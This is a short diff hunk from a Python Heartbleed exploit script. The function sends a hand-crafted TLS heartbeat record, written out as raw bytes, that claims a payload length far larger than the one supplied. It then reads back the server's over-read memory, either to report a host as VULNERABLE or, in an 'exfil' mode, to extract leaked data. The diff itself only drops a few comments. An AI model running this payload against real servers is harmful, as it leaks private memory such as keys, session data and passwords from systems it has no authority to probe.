@@ -32,15 +32,12 @@ def heartbleed(ip, port, mode, num_bytes):
     # TLSRecord(version="TLS_1_2")/TLSHeartBeat(length=2**14-1,data='bleed...')
     # Once again I include the raw bytes to avoid the import
     heartbeat = b'\x18\x03\x03\x00\x0b\x01?\xffbleed...'
-    #heartbeat = TLSRecord(version="TLS_1_2")/TLSHeartBeat(length=num_bytes,data='bleed...')
-    #heartbeat = bytes(heartbeat)
     s.send(heartbeat)
     r = s.recv(2**14-1)
     if r == b'':
         print("Something went wrong. The server didn't reply to the heartbeat.")
         return
     if mode == 'scan':
-        # 200 is arbitrary, large enough to remove false positive
         print("VULNERABLE") if len(r) >= num_bytes else print("SECURE")
     elif mode == 'exfil':
         if len(r) < num_bytes:
